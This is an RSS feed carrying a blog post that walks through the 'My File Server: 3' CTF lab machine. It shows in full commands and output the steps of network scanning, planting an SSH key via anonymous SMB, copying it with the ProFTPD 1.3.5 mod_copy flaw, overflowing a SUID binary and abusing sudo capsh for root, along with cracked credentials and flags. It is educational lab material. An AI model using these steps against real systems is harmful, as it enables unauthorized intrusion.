@@ -1,0 +1,373 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>My File Server: 3 Walkthrough Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/my-file-server-3-walkthrough/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/my-file-server-3-walkthrough/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Tue, 07 Apr 2020 16:21:20 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>My File Server: 3 Walkthrough Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/my-file-server-3-walkthrough/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>My File Server: 3 Walkthrough</title>
+		<link>https://www.armourinfosec.com/my-file-server-3-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/my-file-server-3-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Mon, 06 Apr 2020 05:36:39 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[My File Server: 3 Walkthrough]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25860</guid>
+
+					<description><![CDATA[<p>I will share with you a new Walkthrough for Infosec Warriors CTF machines. My File Server: 3 Walkthrough for the...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-3-walkthrough/">My File Server: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I will share with you a new Walkthrough for <a href="http://www.infosecwarrior.com/"><strong>Infosec Warriors CTF</strong></a> machines. <strong>My File Server: 3 Walkthrough</strong> for the CTF machine is created by Vishal Biswas AKA Cyberknight. You can download here this <a href="https://www.infosecwarrior.com/my-file-server-3/">CTF</a>. It states the level is Intermediate level and that is true. Either way, you explore a little if this is unfamiliar and that&#8217;s how you learn.</p>
+<p><img decoding="async" fetchpriority="high" class="alignnone wp-image-25882 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517.png" alt="My File Server: 3 Walkthrough" width="800" height="302" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517-300x113.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517-768x290.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<h2>Penetration Testing Methodologies</h2>
+<h4>Network Scan</h4>
+<ul>
+<li> Netdicover</li>
+<li> Nmap Enumeration</li>
+</ul>
+<h4>Enumeration</h4>
+<ul>
+<li> Nikto</li>
+<li>Nmap Scripts</li>
+<li> Injecting authorized_keys via smb</li>
+<li> ProFTPd 1.3.5  File Copy</li>
+</ul>
+<h4>Privilege Escalation</h4>
+<ul>
+<li>Buffer overflow</li>
+<li>Capture the Flag.</li>
+<li>password</li>
+<li>sudo</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>So, as we always start with <strong>netdiscover</strong> to get the IP of the VM machine and the IP of the host found is 192.168.2.11</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+
+ Currently scanning: 192.168.60.0/16 | Screen View: Unique Hosts
+
+ 2 Captured ARP Req/Rep packets, from 2 hosts. Total size: 102
+ _____________________________________________________________________________
+ IP At         MAC Address       Count  Len MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.2.2   08:00:27:25:0f:48  1      42 PCS Systemtechnik GmbH
+ 192.168.2.11  08:00:27:a8:98:39  1      60 PCS Systemtechnik GmbH
+</pre>
+<p class="">Let&#8217;s proceed with a network scan using Nmap aggressive scan as given below.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -sC -O 192.168.2.11
+
+ Nmap scan report for 192.168.2.11
+ Not shown: 65523 closed ports
+ PORT STATE SERVICE VERSION
+ 21/tcp open ftp vsftpd 3.0.2
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ |_drwxrwxrwx 3 0 0 16 Feb 19 07:48 pub [NSE: writeable]
+ | ftp-syst:
+ | vsFTPd 3.0.2 - secure, fast, stable
+ 22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
+ | ssh-hostkey:
+ | 2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)
+ 80/tcp open http Apache httpd 2.4.6 ((CentOS))
+ | http-methods:
+ |_http-server-header: Apache/2.4.6 (CentOS)
+ |_http-title: My File Server
+ 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+ 445/tcp open netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
+ 1337/tcp open waste?
+ | fingerprint-strings:
+ | GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, TerminalServerCookie:
+ |_ Why are you here ?!
+ 2049/tcp open nfs_acl 3 (RPC #100227)
+ 2121/tcp open ftp ProFTPD 1.3.5
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ |_drwxrwxrwx 3 root root 16 Feb 19 07:48 pub [NSE: writeable]
+ 20048/tcp open mountd 1-3 (RPC #100005)
+ 35756/tcp open nlockmgr 1-4 (RPC #100021)
+ 35992/tcp open status 1 (RPC #100024)
+ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+ Device type: general purpose
+ Running: Linux 3.X
+ OS CPE: cpe:/o:linux:linux_kernel:3
+ OS details: Linux 3.4 - 3.10
+ Network Distance: 1 hop
+ Service Info: Host: FILESERVER; OS: Unix
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</pre>
+<h3>Enumeration</h3>
+<p>It was very interesting. I noticed many ports were open and have <strong>Anonymous Login enabled. </strong>So I decided to enumerate more with Nmap scripts. Along with port number 80.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p 139,445 --script=smb-enum* 192.168.2.11
+
+ Nmap scan report for 192.168.2.11
+ PORT STATE SERVICE
+ 139/tcp open netbios-ssn
+ 445/tcp open microsoft-ds
+ MAC Address: 08:00:27:A8:98:39 (Oracle VirtualBox virtual NIC)
+ Host script results:
+ | smb-enum-shares:
+ | account_used: &lt;blank&gt;
+ | \\192.168.2.11\IPC$:
+ | Type: STYPE_IPC_HIDDEN
+ | Comment: IPC Service (Samba 4.9.1)
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\tmp
+ | Anonymous access: READ/WRITE
+ | \\192.168.2.11\print$:
+ | Type: STYPE_DISKTREE
+ | Comment: Printer Drivers
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\var\lib\samba\drivers
+ | Anonymous access: &lt;none&gt;
+ | \\192.168.2.11\smbdata:
+ | Type: STYPE_DISKTREE
+ | Comment: smbdata
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\smbdata
+ | Anonymous access: READ/WRITE
+ | \\192.168.2.11\smbuser:
+ | Type: STYPE_DISKTREE
+ | Comment: smbuser
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\home\smbuser\
+ |_ Anonymous access: &lt;none&gt;
+ Nmap done: 1 IP address (1 host up) scanned in 300.66 seconds</pre>
+<p>We know that there might be a &#8220;smbuser&#8221; on the network.</p>
+<p><img decoding="async" class="alignnone wp-image-25886 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-59-28.png" alt="My File Server: 3 Walkthrough" width="292" height="196" /></p>
+<p>I choose to run Nikto for HTTP weak config listing, and found an entry for<strong> .ssh</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true ">#nikto -h http://192.168.2.11/
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP: 192.168.2.11
++ Target Hostname: 192.168.2.11
++ Target Port: 80
++ Start Time: 2020-04-06 01:01:31 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.6 (CentOS)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site differently to the MIME type
++ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD, TRACE
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3093: /.ssh/authorized_keys: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.</pre>
+<p>When I tested &#8220;.ssh&#8221; on web browser&#8230;.. I got ssh folder, containing id_rsa and authorized_keys.</p>
+<p><img decoding="async" class="alignnone wp-image-25880 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1.png" alt="My File Server: 3 Walkthrough" width="474" height="296" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1.png 474w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1-300x187.png 300w" sizes="(max-width: 474px) 100vw, 474px" /></p>
+<p>When I opened authorized_keys. Its confirm that &#8220;smbuser&#8221; is present in host machine or network.</p>
+<p><img decoding="async" class="alignnone wp-image-25881 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-1024x130.png" alt="My File Server: 3 Walkthrough" width="1024" height="130" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-1024x130.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-300x38.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-768x97.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50.png 1170w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>&nbsp;</p>
+<p>I download file authorized_keys in my local Linux</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#wget http://192.168.2.11/.ssh/authorized_keys
+
+ --2020-04-06 01:05:15--  http://192.168.2.11/.ssh/authorized_keys
+ Connecting to 192.168.2.11:80... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 410
+ Saving to: ‘authorized_keys’ 
+ authorized_keys         100%[==============================&gt;]     410  --.-KB/s    in 0s      
+ 2020-04-06 01:05:15 (39.3 MB/s) - ‘authorized_keys’ saved [410/410]</pre>
+<p>We know that &#8220;smbdata&#8221; has <strong>read and write</strong> permission. So if we place the authorized_keys of our Linux and&#8230;&#8230;&#8230;&#8230;&#8230;&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#smbclient //192.168.2.11/smbdata
+
+ Enter WORKGROUP\root's password: 
+ Anonymous login successful
+ Try "help" to get a list of possible commands.
+ smb: \&gt; ls
+  .                                   D        0  Mon Apr  6 00:56:56 2020
+  ..                                  D        0  Tue Feb 18 17:17:54 2020
+  anaconda                            D        0  Tue Feb 18 17:18:15 2020
+  audit                               D        0  Tue Feb 18 17:18:15 2020
+  boot.log                            N     6120  Tue Feb 18 17:18:16 2020
+  btmp                                N      384  Tue Feb 18 17:18:16 2020
+  cron                                N     4813  Tue Feb 18 17:18:16 2020
+  dmesg                               N    31389  Tue Feb 18 17:18:16 2020
+  dmesg.old                           N    31389  Tue Feb 18 17:18:16 2020
+  glusterfs                           D        0  Tue Feb 18 17:18:16 2020
+  lastlog                             N   292292  Tue Feb 18 17:18:16 2020
+  maillog                             N     1982  Tue Feb 18 17:18:16 2020
+  messages                            N   684379  Tue Feb 18 17:18:17 2020
+  ppp                                 D        0  Tue Feb 18 17:18:17 2020
+  samba                               D        0  Tue Feb 18 17:18:17 2020
+  secure                              N    11937  Tue Feb 18 17:18:17 2020
+  spooler                             N        0  Tue Feb 18 17:18:17 2020
+  tallylog                            N        0  Tue Feb 18 17:18:17 2020
+  tuned                               D        0  Tue Feb 18 17:18:17 2020
+  wtmp                                N    25728  Tue Feb 18 17:18:17 2020
+  xferlog                             N      100  Tue Feb 18 17:18:17 2020
+  yum.log                             N    10915  Tue Feb 18 17:18:17 2020
+  sshd_config                         N     3906  Wed Feb 19 13:16:38 2020
+  todo                                N      162  Tue Feb 25 19:52:29 2020
+  id_rsa                              N     1766  Thu Mar 19 10:13:16 2020
+  note.txt                            N      128  Thu Mar 19 10:23:12 2020
+
+		19976192 blocks of size 1024. 18257932 blocks available
+smb: \&gt; exit
+
+#cd .ssh/
+#ls
+ authorized_keys  id_rsa  id_rsa.pub  known_hosts
+#smbclient //192.168.2.11/smbdata
+ Enter WORKGROUP\root's password: 
+ Anonymous login successful
+ Try "help" to get a list of possible commands.
+ smb: \&gt; put authorized_keys 
+ putting file authorized_keys as \authorized_keys (61.7 kb/s) (average 61.7 kb/s)
+ smb: \&gt; 
+</pre>
+<p>It is successfully done. We know that port 2121 ProFTPD 1.3.5 has &#8220;file copy&#8221; vulnerability. So I log in in FTP 2121 without username and password. Then I copy authorized_keys from <strong>/</strong><strong>smbdata</strong> to <strong>/home/smbuser/.ssh/authorized_keys</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#telnet 192.168.2.11 2121
+
+ Trying 192.168.2.11...
+ Connected to 192.168.2.11.
+ Escape character is '^]'.
+  220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.2.11]
+ site help
+  214-The following SITE commands are recognized (* =&gt;'s unimplemented)
+  CPFR &lt;sp&gt; pathname
+  CPTO &lt;sp&gt; pathname
+  HELP
+  CHGRP
+  CHMOD
+  214 Direct comments to root@localhost
+ site cpfr /smbdata/authorized_keys
+  350 File or directory exists, ready for destination name
+ site cpto /home/smbuser/.ssh/authorized_keys
+ 250 Copy successful</pre>
+<p>Now I tried to take ssh from id_rsa file and yehhhhh we got a <strong>smbuser</strong> shell&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:sh highlight:0 decode:true">#ssh smbuser@192.168.2.11 -i id_rsa 
+
+   ##############################################################################################
+   #					  InfoSec Warrior                                       #             
+   #                         --------- www.InfoSecWarrior.com ------------                      #
+   #                                    My File Server - 3					#                    
+   #  			    Just a simple addition to the problem                               #
+   #                               Designed By :- CyberKnight                                   #
+   #                                Twitter    :- @CyberKnight00                                #
+   ##############################################################################################
+
+ Last login: Mon Apr  6 01:39:47 2020 from 192.168.2.1
+ [smbuser@fileserver ~]$ id 
+  uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)
+ [smbuser@fileserver ~]$ hostname 
+  fileserver</pre>
+<p>Here we got two folders at home but I didn&#8217;t get anything and we have no find and locate command for searching suid files. So I have manually searched and I got a file &#8220;<strong>esclate&#8221; </strong> which has suid bit of user bla.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default decode:true">[smbuser@fileserver ~]$  find 
+ -bash: find: command not found
+[smbuser@fileserver ~]$ ls -lha /usr/bin |grep esclate
+ -rwsr-xr-x    1 bla  bla     7.4K Feb 27 00:21 esclate</pre>
+<p>so from this file, we can try to take &#8220;<strong>bla</strong> &#8221; user shell. After feeding a lot of numbers and alphabets .. sometimes it gives &#8220;why are you here?&#8221; and sometimes &#8220;Segmentation fault&#8221; &#8230;</p>
+<p>So I understood what&#8217;s happening here. I gave a value {number} which comes in between both the errors. and yeah &#8220;I got the bla user group&#8221;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">[smbuser@fileserver ~]$ /usr/bin/esclate 
+ 123456789012345678901234567{27}
+ Why are you here ?!
+[smbuser@fileserver ~]$ /usr/bin/esclate
+ 123456789012345687901234567890123456{36}
+ Segmentation fault
+[smbuser@fileserver ~]$ /usr/bin/esclate          
+ 1234567890123456789012345678901{32}
+ Why are you here ?!
+[smbuser@fileserver ~]$ /usr/bin/esclate     
+ 1234567890123456789012345678901234{34}  
+sh-4.2$ id
+ uid=1001(bla) gid=1000(smbuser) groups=1001(bla),1000(smbuser)
+sh-4.2$ hostname 
+ fileserver
+sh-4.2$ uname -a
+ Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+sh-4.2$ 
+</pre>
+<p>Then I tried to go access bla directory and yeh I was finally in.</p>
+<p>and got FLAG of bla user.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ cd home
+sh-4.2$ ls 
+ bla  smbuser
+sh-4.2$ cd bla
+sh-4.2$ ls -lha
+ total 40K
+ drwx------  2 bla  bla  121 Feb 27 00:29 .
+ drwxr-xr-x. 4 root root  30 Feb 25 16:21 ..
+ lrwxrwxrwx  1 bla  bla    9 Feb 25 19:57 .bash_history -&gt; /dev/null
+ -rw-r--r--  1 bla  bla   18 Mar  6  2015 .bash_logout
+ -rw-r--r--  1 bla  bla  193 Mar  6  2015 .bash_profile
+ -rw-r--r--  1 bla  bla  231 Mar  6  2015 .bashrc
+ -rw-rw-r--  1 bla  bla  516 Feb 27 00:29 user.txt
+ -rw-------  1 bla  bla  731 Feb 26 23:36 .viminfo
+ -rwxr-xr-x  1 root root 19K Feb 25 16:22 ynetd
+sh-4.2$ cat user.txt
+   _____ _ _      ____                                     _____ 
+  |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / 
+  | |_  | | |/ _ \___ \ / _ \ '__\ \ / / _ \ '__|  _____    |_ \ 
+  |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |
+  |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/                                                           
+ Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f
+ you can crack this hash, because it is also my pasword
+ note: crack it, itiseasy</pre>
+<p>so after cracking the hash, I got bla user password <strong>bla:itiseasy. </strong>After that, I checked sudo permissions and writes. and I got the two things which can run by Sudo &#8220;capsh&#8221; and &#8220;setcap&#8221;.</p>
+<p>and I got the root shell&#8230;..</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ sudo -l
+ Matching Defaults entries for bla on this host:
+     requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+     env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
+     _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+ User bla may run the following commands on this host:
+     (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap
+
+sh-4.2$ sudo -u root /usr/sbin/capsh --
+[root@fileserver bla]# id
+ uid=0(root) gid=0(root) groups=0(root)
+[root@fileserver bla]# cd /root/
+[root@fileserver ~]# ls 
+ proof.txt
+[root@fileserver ~]# cat proof.txt 
+     _______ __    _____                                       _____
+    / ____(_) /__ / ___/___  ______   _____  _____            |__  /
+   / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; 
+  / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / 
+ /_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  
+                                                                
+ flag : 7be300997079eaebcdf9975ede6746e9
+[root@fileserver ~]# id
+ uid=0(root) gid=0(root) groups=0(root)
+[root@fileserver ~]# hostname
+ fileserver
+[root@fileserver ~]# 
+
+</pre>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-3-walkthrough/">My File Server: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/my-file-server-3-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
